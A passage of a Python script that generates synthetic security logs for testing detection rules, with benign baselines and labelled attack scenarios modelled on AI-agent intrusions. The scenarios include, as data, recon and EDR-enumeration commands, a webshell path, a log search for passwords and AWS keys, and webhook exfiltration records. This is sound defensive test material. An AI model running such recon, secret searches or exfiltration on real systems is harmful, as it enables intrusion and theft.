"""100% benign, offline synthetic multi-surface telemetry generator for safe detection validation.

Generates realistic baseline noise (for false-positive testing) and synthetic agentic
behavioral patterns across Cisco ASA/FTD, Citrix NetScaler, Palo Alto PAN-OS,
F5 BIG-IP, Zscaler NSS, Web Portals, and Local User Endpoints. Contains zero live
malware, zero exploits, and makes zero network connections.
"""

from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any


def _iso(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def _write_lines(path: Path, lines: list[str]) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return path


def _write_jsonl(path: Path, records: list[dict[str, Any]]) -> Path:
    return _write_lines(path, [json.dumps(r, ensure_ascii=False) for r in records])


def generate_synthetic_suite(out_dir: str | Path, *, seed: int = 42) -> dict[str, dict[str, Any]]:
    """Write all benign baseline datasets, synthetic attack-pattern scenarios, and raw appliance logs.

    Returns a manifest mapping dataset name -> metadata (path, expected_positive, expected_reasons, format).
    """
    rng = random.Random(seed)
    base_dir = Path(out_dir)
    base_dir.mkdir(parents=True, exist_ok=True)
    t0 = datetime(2026, 11, 20, 9, 0, 0, tzinfo=timezone.utc)
    manifest: dict[str, dict[str, Any]] = {}

    # ------------------------------------------------------------------
    # BENIGN BASELINES (MUST PRODUCE 0 FALSE POSITIVES)
    # ------------------------------------------------------------------

    # 1. Baseline Cisco ASA/FTD VPN logins (human-paced with natural jitter + 1 typo)
    asa_base_lines = []
    cur = t0
    for user, ip, ok in [
        ("jsmith", "198.51.100.20", True),
        ("mchen", "198.51.100.21", False),
        ("mchen", "198.51.100.21", True),
        ("rpatel", "198.51.100.22", True),
        ("agarcia", "198.51.100.23", True),
    ]:
        cur += timedelta(seconds=rng.randint(18, 65))
        if ok:
            asa_base_lines.append(
                f"{_iso(cur)} fw-asa-01 %ASA-6-113004: AAA user authentication Successful : server = 10.1.1.5 : user = {user} : user IP = {ip}"
            )
        else:
            asa_base_lines.append(
                f"{_iso(cur)} fw-asa-01 %ASA-6-113005: AAA user authentication Rejected : reason = AAA failure : user = {user} : user IP = {ip}"
            )
    p = _write_lines(base_dir / "baseline_cisco_asa_ftd.syslog", asa_base_lines)
    manifest["baseline_cisco_asa_ftd"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "cisco_asa_ftd",
        "surface": "edge_appliance",
    }

    # 2. Baseline Citrix NetScaler morning logins + 30s health probe
    citrix_base_lines = []
    cur = t0 + timedelta(minutes=5)
    for i, user in enumerate(["alice", "bob", "carol", "dave"]):
        cur += timedelta(seconds=rng.randint(25, 70))
        citrix_base_lines.append(
            f"{_iso(cur)} adc-gw-01 PPE-0 : SSLVPN LOGIN : User {user} - Client_ip 198.51.100.{40+i} - /vpn/index.html"
        )
    p = _write_lines(base_dir / "baseline_citrix_netscaler.log", citrix_base_lines)
    manifest["baseline_citrix_netscaler"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "citrix_netscaler",
        "surface": "edge_appliance",
    }

    # 3. Baseline PAN-OS GlobalProtect logins
    panos_base_lines = []
    cur = t0 + timedelta(minutes=10)
    for i, user in enumerate(["eng01", "eng02", "ops01"]):
        cur += timedelta(seconds=rng.randint(30, 80))
        panos_base_lines.append(
            f"{_iso(cur)},007200001234,GLOBALPROTECT,gateway-auth,198.51.100.{60+i},gp.corp.local,{user},success,/global-protect/login.esp,PAN-GP-Client/6.2"
        )
    p = _write_lines(base_dir / "baseline_panos.csv", panos_base_lines)
    manifest["baseline_panos"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "panos",
        "surface": "edge_appliance",
    }

    # 4. Baseline F5 BIG-IP APM normal sessions
    f5_base_lines = []
    cur = t0 + timedelta(minutes=15)
    for i, user in enumerate(["fin01", "fin02", "hr01"]):
        cur += timedelta(seconds=rng.randint(20, 60))
        f5_base_lines.append(
            f"{_iso(cur)} bigip-01 notice apmd[4120]: Session established for user={user} from 198.51.100.{80+i} /my.policy"
        )
    p = _write_lines(base_dir / "baseline_f5_bigip.syslog", f5_base_lines)
    manifest["baseline_f5_bigip"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "f5_bigip",
        "surface": "edge_appliance",
    }

    # 5. Baseline Zscaler NSS normal web browsing
    zscaler_base = []
    cur = t0 + timedelta(minutes=20)
    for host, url in [
        ("docs.python.org", "/3/library/index.html"),
        ("github.com", "/org/internal-app"),
        ("status.cloud.google.com", "/incidents"),
        ("portal.corp.local", "/dashboard"),
    ]:
        cur += timedelta(seconds=rng.randint(20, 55))
        zscaler_base.append(
            {
                "datetime": _iso(cur),
                "ClientIP": "10.10.5.42",
                "user": "alice@corp.local",
                "hostname": host,
                "url": url,
                "requestmethod": "GET",
                "responsecode": 200,
                "useragent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/130.0",
                "urlcategory": "Information Technology",
            }
        )
    p = _write_jsonl(base_dir / "baseline_zscaler_nss.jsonl", zscaler_base)
    manifest["baseline_zscaler_nss"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "jsonl",
        "surface": "web_portal",
    }

    # 6. Baseline local workstation admin activity (human think-time gaps)
    endpoint_base = []
    cur = t0 + timedelta(minutes=25)
    for cmd in ["git status", "git pull", "python3 manage.py test", "whoami"]:
        cur += timedelta(seconds=rng.randint(25, 75))
        endpoint_base.append(
            {
                "timestamp": _iso(cur),
                "source_host": "wkstn-dev-04",
                "actor": "dev-ben",
                "event_type": "process",
                "surface": "endpoint",
                "process": "bash",
                "parent_process": "foot",
                "command_line": cmd,
                "status_code": 0,
            }
        )
    p = _write_jsonl(base_dir / "baseline_endpoint.jsonl", endpoint_base)
    manifest["baseline_endpoint"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "jsonl",
        "surface": "endpoint",
    }

    # 7. Hard FP Stress Test: Developer reading CLAUDE.md, nist.gov, /docs, & signed Brother printer DLL
    hard_fp_dev = []
    cur = t0 + timedelta(minutes=30)
    for ev in [
        {"event_type": "http", "surface": "web_portal", "dest_host": "nvd.nist.gov", "http_method": "GET", "http_path": "/vuln/detail/CVE-2026-1000", "status_code": 200, "user_agent": "Mozilla/5.0 Chrome/131.0"},
        {"event_type": "http", "surface": "web_portal", "dest_host": "docs.internal.local", "http_method": "GET", "http_path": "/docs/api-guide", "status_code": 200, "user_agent": "Mozilla/5.0 Chrome/131.0"},
        {"event_type": "process", "surface": "endpoint", "process": "cat", "parent_process": "bash", "command_line": "cat CLAUDE.md", "status_code": 0},
        {"event_type": "process", "surface": "endpoint", "process": "spoolsv.exe", "parent_process": "services.exe", "command_line": "C:\\Windows\\System32\\spoolsv.exe BrLogApi.dll", "status_code": 0},
    ]:
        cur += timedelta(seconds=rng.randint(25, 60))
        hard_fp_dev.append({"timestamp": _iso(cur), "source_host": "wkstn-dev-09", "actor": "dev-sam", **ev})
    p = _write_jsonl(base_dir / "baseline_hard_fp_dev_docs.jsonl", hard_fp_dev)
    manifest["baseline_hard_fp_dev_docs"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "jsonl",
        "surface": "endpoint",
    }

    # 8. Hard FP Stress Test: Routine cloud ops admin (normal Describe/List calls spaced naturally)
    hard_fp_cloud = []
    cur = t0 + timedelta(minutes=35)
    for act in ["DescribeInstances", "ListBuckets", "GetCallerIdentity"]:
        cur += timedelta(seconds=rng.randint(35, 90))
        hard_fp_cloud.append(
            {
                "timestamp": _iso(cur),
                "source_host": "cloudtrail",
                "actor": "arn:aws:iam::111122223333:role/ops-readonly",
                "event_type": "cloud_iam",
                "surface": "cloud_iam",
                "action": act,
                "status_code": 200,
            }
        )
    p = _write_jsonl(base_dir / "baseline_hard_fp_cloud_admin.jsonl", hard_fp_cloud)
    manifest["baseline_hard_fp_cloud_admin"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "jsonl",
        "surface": "cloud_iam",
    }

    # 9. Hard Behavioral FP Stress Test: Flat chunked file upload + noisy web browsing (must NOT trigger sawtooth flow)
    hard_fp_chunked: list[dict[str, Any]] = []
    cur = t0 + timedelta(minutes=40)
    for gap, b_out, b_in, host, path in [
        (6, 65536, 256, "storage.corp.local", "/upload/chunk/1"),
        (8, 65536, 256, "storage.corp.local", "/upload/chunk/2"),
        (5, 65536, 256, "storage.corp.local", "/upload/chunk/3"),
        (11, 65536, 256, "storage.corp.local", "/upload/chunk/4"),
        (7, 65536, 256, "storage.corp.local", "/upload/chunk/5"),
        (14, 420, 4200, "docs.vendor.example", "/guide/intro"),
        (9, 1280, 1850, "docs.vendor.example", "/guide/setup"),
        (18, 350, 9600, "docs.vendor.example", "/guide/faq"),
        (12, 810, 3100, "docs.vendor.example", "/guide/changelog"),
    ]:
        cur += timedelta(seconds=gap)
        hard_fp_chunked.append(
            {
                "timestamp": _iso(cur),
                "source_host": "wkstn-design-02",
                "actor": "elena",
                "event_type": "http",
                "surface": "web_portal",
                "dest_host": host,
                "dest_port": 443,
                "http_method": "POST" if "upload" in path else "GET",
                "http_path": path,
                "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/131.0.0.0",
                "ja4": "t13d1516h2_8daaf6152771_e5627efa2ab1",
                "ja4h": "ge11cn20enus_60a1c1a3a9d9_000000000000_000000000000",
                "bytes_out": b_out,
                "bytes_in": b_in,
                "status_code": 200,
            }
        )
    p = _write_jsonl(base_dir / "baseline_hard_fp_chunked_upload.jsonl", hard_fp_chunked)
    manifest["baseline_hard_fp_chunked_upload"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "jsonl",
        "surface": "web_portal",
    }

    # 10. Hard Behavioral FP Stress Test: Routine CI/dev commands (head/2>&1) + periodic /healthz poll (single JA4)
    hard_fp_ci: list[dict[str, Any]] = []
    cur = t0 + timedelta(minutes=45)
    for gap, cmd in [
        (12, "git log --oneline | head -n 10"),
        (19, "pytest tests/unit 2>&1"),
        (25, "whoami"),
        (16, "git status"),
    ]:
        cur += timedelta(seconds=gap)
        hard_fp_ci.append(
            {
                "timestamp": _iso(cur),
                "source_host": "ci-runner-02",
                "actor": "ci-bot",
                "event_type": "process",
                "surface": "endpoint",
                "process": "bash",
                "parent_process": "systemd",
                "command_line": cmd,
                "status_code": 0,
            }
        )
    cur_poll = t0 + timedelta(minutes=45)
    for _ in range(3):
        cur_poll += timedelta(seconds=30)
        hard_fp_ci.append(
            {
                "timestamp": _iso(cur_poll),
                "source_host": "10.30.0.15",
                "actor": "health-probe",
                "event_type": "http",
                "surface": "web_portal",
                "dest_host": "app.corp.local",
                "dest_port": 443,
                "http_method": "GET",
                "http_path": "/healthz",
                "user_agent": "CorpHealthMonitor/2.1",
                "ja4": "t13d1715h2_5b57614c22b0_3d5424432f57",
                "ja4h": "ge11nn040000_2d91f4a3c1b0_000000000000_000000000000",
                "status_code": 200,
            }
        )
    p = _write_jsonl(base_dir / "baseline_hard_fp_ci_and_cron.jsonl", hard_fp_ci)
    manifest["baseline_hard_fp_ci_and_cron"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "jsonl",
        "surface": "endpoint",
    }

    # 11. Hard Behavioral FP Stress Test: Normal single browser hitting 10 pages with ONE consistent JA4/JA4H
    hard_fp_browser: list[dict[str, Any]] = []
    cur = t0 + timedelta(minutes=50)
    for gap, path in [
        (3, "/"),
        (12, "/assets/app.js"),
        (5, "/assets/app.css"),
        (18, "/api/me"),
        (4, "/dashboard"),
        (15, "/reports"),
        (7, "/settings"),
        (11, "/notifications"),
        (20, "/profile"),
        (8, "/help"),
    ]:
        cur += timedelta(seconds=gap)
        hard_fp_browser.append(
            {
                "timestamp": _iso(cur),
                "source_host": "198.51.100.140",
                "actor": "198.51.100.140",
                "event_type": "http",
                "surface": "web_portal",
                "dest_host": "portal.corp.local",
                "dest_port": 443,
                "http_method": "GET",
                "http_path": path,
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
                "ja4": "t13d1516h2_8daaf6152771_e5627efa2ab1",
                "ja4h": "ge11cn20enus_60a1c1a3a9d9_000000000000_000000000000",
                "status_code": 200,
            }
        )
    p = _write_jsonl(base_dir / "baseline_hard_fp_single_browser_nat.jsonl", hard_fp_browser)
    manifest["baseline_hard_fp_single_browser_nat"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "jsonl",
        "surface": "web_portal",
    }

    # 12. Baseline Okta Morning SSO Logins (native Okta System Log JSON; includes 1 benign mistyped password)
    okta_base: list[dict[str, Any]] = []
    cur = t0 + timedelta(minutes=55)
    for gap, ip, user, res, reason in [
        (20, "198.51.100.31", "alice@corp.local", "SUCCESS", ""),
        (28, "198.51.100.32", "bob@corp.local", "FAILURE", "INVALID_CREDENTIALS"),
        (14, "198.51.100.32", "bob@corp.local", "SUCCESS", ""),
        (35, "198.51.100.33", "carol@corp.local", "SUCCESS", ""),
        (42, "198.51.100.34", "dave@corp.local", "SUCCESS", ""),
    ]:
        cur += timedelta(seconds=gap)
        okta_base.append(
            {
                "published": _iso(cur),
                "eventType": "user.session.start",
                "actor": {"alternateId": user, "displayName": user.split("@")[0]},
                "client": {
                    "ipAddress": ip,
                    "userAgent": {"rawUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0"},
                },
                "outcome": {"result": res, "reason": reason},
                "debugContext": {"debugData": {"requestUri": "/login/login.htm"}},
                "target": [{"displayName": "Okta Dashboard", "alternateId": "okta.dashboard"}],
            }
        )
    p = _write_jsonl(base_dir / "baseline_okta_morning_sso.jsonl", okta_base)
    manifest["baseline_okta_morning_sso"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "jsonl",
        "surface": "cloud_iam",
    }

    # 13. Baseline Entra ID Routine User & Service Principal Sign-Ins (native Entra JSON; 0 FPs)
    entra_base: list[dict[str, Any]] = []
    cur = t0 + timedelta(minutes=58)
    for gap, sp_name, resource in [
        (18, "sp-nightly-report", "Microsoft Graph"),
        (25, "sp-nightly-report", "Azure Storage"),
        (30, "sp-billing-sync", "Microsoft Graph"),
    ]:
        cur += timedelta(seconds=gap)
        entra_base.append(
            {
                "createdDateTime": _iso(cur),
                "ipAddress": "10.80.1.15",
                "servicePrincipalName": sp_name,
                "resourceDisplayName": resource,
                "isInteractive": False,
                "status": {"errorCode": 0, "failureReason": ""},
            }
        )
    p = _write_jsonl(base_dir / "baseline_entra_sp_routine.jsonl", entra_base)
    manifest["baseline_entra_sp_routine"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "jsonl",
        "surface": "cloud_iam",
    }

    # ------------------------------------------------------------------
    # SYNTHETIC AGENTIC SCENARIOS (100% BENIGN FIXTURES — MUST DETECT)
    # ------------------------------------------------------------------

    # Scenario 1: Cisco ASA/FTD Rapid VPN Spray (native syslog)
    asa_attack_lines = []
    cur = t0 + timedelta(hours=1)
    for i, uri in enumerate(
        [
            "/+CSCOE+/logon.html",
            "/+CSCOE+/winvista.html",
            "/+webvpn+/index.html",
            "/+CSCOE+/saml/sp/acs",
            "/+CSCOE+/translation.js",
            "/+webvpn+/login.html",
            "/+CSCOE+/session_password.html",
            "/+CSCOE+/logon.html",
            "/+CSCOE+/logon.html",
        ]
    ):
        cur += timedelta(seconds=1.0 + rng.uniform(-0.08, 0.08))
        prod = "FTD" if i % 2 == 0 else "ASA"
        asa_attack_lines.append(
            f"{_iso(cur)} fw-asa-01 %{prod}-6-113005: AAA user authentication Rejected : reason = AAA failure : user = vpnadmin : user IP = 203.0.113.55 {uri}"
        )
    p = _write_lines(base_dir / "scenario_cisco_asa_ftd_spray.syslog", asa_attack_lines)
    manifest["scenario_cisco_asa_ftd_spray"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "cisco_asa_ftd",
        "surface": "edge_appliance",
        "expected_reasons": ["edge_vpn_rapid_spray", "edge_appliance_path_probe", "machine_speed_burst"],
    }

    # Scenario 2: Citrix NetScaler Probing -> Webshell Spawn & Endpoint Artifact (Cross-Surface JSONL)
    citrix_attack: list[dict[str, Any]] = []
    cur = t0 + timedelta(hours=2)
    for path, code in [
        ("/vpn/index.html", 403),
        ("/nf/auth/doAuthentication.do", 401),
        ("/logon/LogonPoint/index.html", 403),
        ("/p/u/getAuthenticationRequirements.do", 404),
        ("/vpn/tmindex.html", 403),
        ("/nf/auth/startwebview.do", 403),
        ("/vpn/../admin/config.xml", 403),
        ("/admin/shell.php", 200),
    ]:
        cur += timedelta(seconds=1.1 + rng.uniform(-0.06, 0.06))
        citrix_attack.append(
            {
                "timestamp": _iso(cur),
                "source_host": "203.0.113.77",
                "actor": "ext-probe-02",
                "event_type": "edge_auth",
                "surface": "edge_appliance",
                "appliance": "citrix_netscaler",
                "dest_host": "app-citrix-01",
                "dest_port": 443,
                "http_method": "POST",
                "http_path": path,
                "user_agent": "Mozilla/5.0 HeadlessChrome/130.0 norma-agent",
                "status_code": code,
                "action": "citrix_gateway_probe",
            }
        )
    # 90 seconds later: endpoint pivot on the gateway/adjacent web server
    cur += timedelta(seconds=90)
    citrix_attack.extend(
        [
            {
                "timestamp": _iso(cur),
                "source_host": "app-citrix-01",
                "actor": "svc-web",
                "event_type": "process",
                "surface": "endpoint",
                "process": "cmd.exe",
                "parent_process": "w3wp.exe",
                "command_line": "sc query CSFalconService",
                "status_code": 0,
            },
            {
                "timestamp": _iso(cur + timedelta(seconds=1.2)),
                "source_host": "app-citrix-01",
                "actor": "svc-web",
                "event_type": "network",
                "surface": "endpoint",
                "process": "C:\\ProgramData\\artx5v\\worker.exe",
                "dest_host": "10.99.0.21",
                "dest_port": 8790,
                "status_code": 200,
            },
        ]
    )
    p = _write_jsonl(base_dir / "scenario_citrix_probe_to_webshell.jsonl", citrix_attack)
    manifest["scenario_citrix_probe_to_webshell"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "edge_appliance",
        "expect_kill_chain": True,
        "expected_reasons": [
            "edge_appliance_path_probe",
            "web_error_correction_pivot",
            "web_parent_shell_spawn",
            "edr_sensor_enumeration",
            "agentic_default_port",
        ],
    }

    # Scenario 3: PAN-OS GlobalProtect & F5 BIG-IP Rapid Edge Fingerprinting (native Nginx proxy log)
    edge_nginx_lines = []
    cur = t0 + timedelta(hours=3)
    for path, status in [
        ("/global-protect/prelogin.esp", 403),
        ("/ssl-vpn/hipreport.esp", 403),
        ("/global-protect/login.esp", 401),
        ("/my.policy", 401),
        ("/tmui/login.jsp", 403),
        ("/mgmt/tm/util/bash", 401),
        ("/mgmt/tm/sys/version", 401),
        ("/tmui/locallb/workspace/fileRead.jsp", 403),
        ("/mgmt/tm/auth/user", 401),
    ]:
        cur += timedelta(seconds=1.0)
        clf_ts = cur.strftime("%d/%b/%Y:%H:%M:%S +0000")
        edge_nginx_lines.append(
            f'203.0.113.88 - - [{clf_ts}] "GET {path} HTTP/1.1" {status} 512 "-" "Nuclei - Open-source project (v3.3)"'
        )
    p = _write_lines(base_dir / "scenario_panos_f5_edge_fingerprint.access.log", edge_nginx_lines)
    manifest["scenario_panos_f5_edge_fingerprint"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "web_access",
        "surface": "edge_appliance",
        "expected_reasons": ["edge_vpn_rapid_spray", "edge_appliance_path_probe", "agentic_user_agent_burst"],
    }

    # Scenario 4: Zscaler NSS Web Error-Correction Loop + Webhook/LLM Egress + Cloud IAM Pivot
    zscaler_attack: list[dict[str, Any]] = []
    cur = t0 + timedelta(hours=4)
    for host, url, code in [
        ("portal.corp.local", "/api/v1/admin", 403),
        ("portal.corp.local", "/api/v1/config", 404),
        ("portal.corp.local", "/api/v1/debug", 403),
        ("portal.corp.local", "/api/v1/secrets", 401),
        ("portal.corp.local", "/api/v2/export", 403),
        ("portal.corp.local", "/.env", 200),
        ("api.anthropic.com", "/v1/messages", 200),
        ("webhook.site", "/a1b2c3d4-dump", 200),
    ]:
        cur += timedelta(seconds=1.2)
        zscaler_attack.append(
            {
                "datetime": _iso(cur),
                "ClientIP": "10.20.4.19",
                "user": "svc-portal-01",
                "hostname": host,
                "url": url,
                "requestmethod": "POST" if code == 200 and host != "portal.corp.local" else "GET",
                "responsecode": code,
                "useragent": "python-httpx/0.28.1",
                "urlcategory": "Web Services",
            }
        )
    cur += timedelta(minutes=2)
    for act in ("AddServicePrincipalCredentials", "ConsentToApplication", "AddAppRoleAssignment"):
        cur += timedelta(seconds=3.0)
        zscaler_attack.append(
            {
                "timestamp": _iso(cur),
                "source_host": "10.20.4.19",
                "actor": "sp-portal-automation",
                "event_type": "cloud_iam",
                "surface": "cloud_iam",
                "action": act,
                "status_code": 200,
            }
        )
    p = _write_jsonl(base_dir / "scenario_zscaler_web_error_loop.jsonl", zscaler_attack)
    manifest["scenario_zscaler_web_error_loop"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "web_portal",
        "expect_kill_chain": True,
        "expected_reasons": [
            "web_error_correction_pivot",
            "llm_api_egress",
            "webhook_exfil_egress",
            "cloud_iam_privilege_burst",
        ],
    }

    # Scenario 5: Local User Box 14-Second Compressed Recon & Cloud-CLI Burst
    local_box_attack: list[dict[str, Any]] = []
    cur = t0 + timedelta(hours=5)
    for cmd in [
        "whoami /all",
        "ipconfig /all",
        "nltest /domain_trusts",
        "net localgroup administrators",
        "aws sts get-caller-identity",
        "az account show",
        "sc query WinDefend",
        "sc query SentinelAgent",
    ]:
        cur += timedelta(seconds=1.5)
        local_box_attack.append(
            {
                "timestamp": _iso(cur),
                "source_host": "wkstn-finance-12",
                "actor": "jdoe",
                "event_type": "process",
                "surface": "endpoint",
                "process": "powershell.exe",
                "parent_process": "explorer.exe",
                "command_line": cmd,
                "status_code": 0,
            }
        )
    p = _write_jsonl(base_dir / "scenario_local_box_recon_burst.jsonl", local_box_attack)
    manifest["scenario_local_box_recon_burst"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "endpoint",
        "expected_reasons": [
            "endpoint_compressed_recon_burst",
            "edr_sensor_enumeration",
            "machine_speed_burst",
            "low_jitter_programmatic_cadence",
        ],
    }

    # Scenario 6: Unit 42 Playbook (zzq canary + spec-driven OpenAPI targeting + 422 retry + PUT->GET readback + 27s Think-Act pause)
    unit42_attack: list[dict[str, Any]] = []
    cur = t0 + timedelta(hours=6)
    # Burst 1 (4 requests at 1s spacing)
    for method, path, code in [
        ("GET", "/zzzrandom12345", 404),
        ("POST", "/login?user=zz_no_such_user_9f3a", 401),
        ("GET", "/openapi.json", 200),
        ("PUT", "/api/v1/update-documents", 422),
    ]:
        unit42_attack.append(
            {
                "timestamp": _iso(cur),
                "source_host": "31.40.205.155",
                "actor": "zz_no_such_user_9f3a",
                "event_type": "http",
                "surface": "web_portal",
                "http_method": method,
                "http_path": path,
                "user_agent": "Mozilla/5.0 (security-testing; authorized)",
                "status_code": code,
            }
        )
        cur += timedelta(seconds=1.0)
    # 27-second LLM inference pause (Unit 42 measured 25-31s)
    cur += timedelta(seconds=27.0)
    # Burst 2 (4 requests: corrected writes + immediate 1s GET read-back)
    for method, path, code in [
        ("PUT", "/api/v1/update-documents", 200),
        ("GET", "/api/v1/update-documents", 200),
        ("PUT", "/api/v1/batch-update-documents", 200),
        ("GET", "/api/v1/batch-update-documents", 200),
    ]:
        unit42_attack.append(
            {
                "timestamp": _iso(cur),
                "source_host": "31.40.205.155",
                "actor": "zz_no_such_user_9f3a",
                "event_type": "http",
                "surface": "web_portal",
                "http_method": method,
                "http_path": path,
                "user_agent": "Mozilla/5.0 (security-testing; authorized)",
                "status_code": code,
            }
        )
        cur += timedelta(seconds=1.0)
    p = _write_jsonl(base_dir / "scenario_unit42_spec_canary_think_act.jsonl", unit42_attack)
    manifest["scenario_unit42_spec_canary_think_act"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "web_portal",
        "expected_reasons": [
            "unit42_agentic_canary_probe",
            "spec_driven_api_targeting",
            "write_then_readback_verification",
            "think_act_bimodal_cadence",
            "agentic_user_agent_burst",
        ],
    }

    # Scenario 7: VAPOR PANDA BLOODALCHEMY + ARTEX Operator Host Forensics (Theori / CrowdStrike)
    ba_host_attack: list[dict[str, Any]] = []
    cur = t0 + timedelta(hours=7)
    ba_host_attack.extend(
        [
            {
                "timestamp": _iso(cur),
                "source_host": "relay-ops-02",
                "actor": "root",
                "event_type": "process",
                "surface": "endpoint",
                "process": "rundll32.exe",
                "command_line": "rundll32.exe graphics-hook-filter64.dll,Init artex_config.json",
                "status_code": 0,
            },
            {
                "timestamp": _iso(cur + timedelta(seconds=1.5)),
                "source_host": "relay-ops-02",
                "actor": "root",
                "event_type": "http",
                "surface": "network",
                "dest_host": "api.xcai.pro",
                "dest_port": 8788,
                "http_method": "POST",
                "http_path": "/Inform/logger/heartbeat",
                "user_agent": "artex-selfupdate",
                "status_code": 200,
            },
            {
                "timestamp": _iso(cur + timedelta(seconds=3.0)),
                "source_host": "relay-ops-02",
                "actor": "root",
                "event_type": "file",
                "surface": "endpoint",
                "command_line": "write /opt/artex/tasks/104/i3185/cmd-output/001.txt traffic/_ca/mitmproxy-ca-cert.pem",
                "http_path": "/api/exploration/graph",
                "status_code": 200,
            },
        ]
    )
    p = _write_jsonl(base_dir / "scenario_bloodalchemy_and_artex_host.jsonl", ba_host_attack)
    manifest["scenario_bloodalchemy_and_artex_host"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "endpoint",
        "expected_reasons": [
            "known_artex_artifact",
            "artex_console_or_host_forensics",
            "agentic_default_port",
            "llm_api_egress",
            "agentic_user_agent_burst",
        ],
    }

    # Scenario 8: ThreatDefence AWS CloudWatch Secret Search + DryRun Burst (native CloudTrail) + Multi-UA 404 Rotation
    aws_ua_attack: list[dict[str, Any]] = []
    cur = t0 + timedelta(hours=8)
    aws_ua_attack.append(
        {
            "eventVersion": "1.09",
            "eventTime": _iso(cur),
            "eventSource": "logs.amazonaws.com",
            "eventName": "FilterLogEvents",
            "sourceIPAddress": "203.0.113.99",
            "userAgent": "aws-cli/2.17.0",
            "userIdentity": {"type": "IAMUser", "arn": "arn:aws:iam::111122223333:user/leaked-ci"},
            "requestParameters": {"filterPattern": "password OR AKIA OR secret", "limit": 1000},
        }
    )
    for i in range(4):
        cur += timedelta(seconds=1.2)
        aws_ua_attack.append(
            {
                "eventVersion": "1.09",
                "eventTime": _iso(cur),
                "eventSource": "ec2.amazonaws.com",
                "eventName": "RunInstancesDryRun",
                "sourceIPAddress": "203.0.113.99",
                "userAgent": "aws-cli/2.17.0",
                "userIdentity": {"type": "IAMUser", "arn": "arn:aws:iam::111122223333:user/leaked-ci"},
                "errorCode": "Client.DryRunOperation",
            }
        )
    # Multi-UA 404 rotation against web portal from one source IP
    cur += timedelta(seconds=30)
    for ua in [
        "ArtEx/1.0",
        "Mozilla/5.0 (spa-api-recon spider)",
        "ReconProbe/1.0",
        "artex-i21861-canary",
    ]:
        cur += timedelta(seconds=1.0)
        aws_ua_attack.append(
            {
                "timestamp": _iso(cur),
                "source_host": "203.0.113.99",
                "actor": "203.0.113.99",
                "event_type": "http",
                "surface": "web_portal",
                "http_method": "GET",
                "http_path": f"/api/probe/{ua[:8]}",
                "user_agent": ua,
                "status_code": 404,
            }
        )
    p = _write_jsonl(base_dir / "scenario_aws_cloudwatch_dryrun_and_ua_rotation.jsonl", aws_ua_attack)
    manifest["scenario_aws_cloudwatch_dryrun_and_ua_rotation"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "cloud_iam",
        "expect_kill_chain": True,
        "expected_reasons": [
            "cloud_secret_search_or_dryrun_burst",
            "ua_diversity_on_errors",
            "agentic_user_agent_burst",
        ],
    }

    # ------------------------------------------------------------------
    # ZERO-IOC ADVERSARIAL EVASION SCENARIOS (0 STATIC IOCs — PURE BEHAVIOR)
    # ------------------------------------------------------------------

    # Scenario 9: Zero-IOC Self-Hosted LLM Proxy Sawtooth Context Flow on TCP/443
    zero_ioc_sawtooth: list[dict[str, Any]] = []
    cur = t0 + timedelta(hours=9)
    for b_out, b_in in [
        (3800, 1800),
        (8400, 2400),
        (15900, 3100),
        (26500, 2900),
        (41200, 4200),
        (58000, 3600),
    ]:
        zero_ioc_sawtooth.append(
            {
                "timestamp": _iso(cur),
                "source_host": "wkstn-ops-17",
                "actor": "mthompson",
                "event_type": "http",
                "surface": "network",
                "dest_host": "relay-node-44.example-vps.net",
                "dest_port": 443,
                "http_method": "POST",
                "http_path": "/sync",
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
                "bytes_out": b_out,
                "bytes_in": b_in,
                "status_code": 200,
            }
        )
        cur += timedelta(seconds=10.0)
    p = _write_jsonl(base_dir / "scenario_zero_ioc_sawtooth_llm_proxy.jsonl", zero_ioc_sawtooth)
    manifest["scenario_zero_ioc_sawtooth_llm_proxy"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "network",
        "zero_ioc": True,
        "expected_reasons": ["llm_sawtooth_context_flow"],
    }

    # Scenario 10: Zero-IOC Slowed Multi-Worker Redundant Recon + LLM CLI Context Idioms
    zero_ioc_idioms: list[dict[str, Any]] = []
    cur = t0 + timedelta(hours=10)
    for cmd in [
        "whoami /all",
        "ipconfig /all",
        "which nmap curl python3 jq 2>/dev/null",
        "whoami /all",
        "curl -sSk --max-time 10 https://intranet.internal/api | head -n 40",
        "ipconfig /all",
        'echo "=== NET ===" && ip route 2>&1',
        "whoami /all",
    ]:
        zero_ioc_idioms.append(
            {
                "timestamp": _iso(cur),
                "source_host": "srv-app-08",
                "actor": "svc-deploy",
                "event_type": "process",
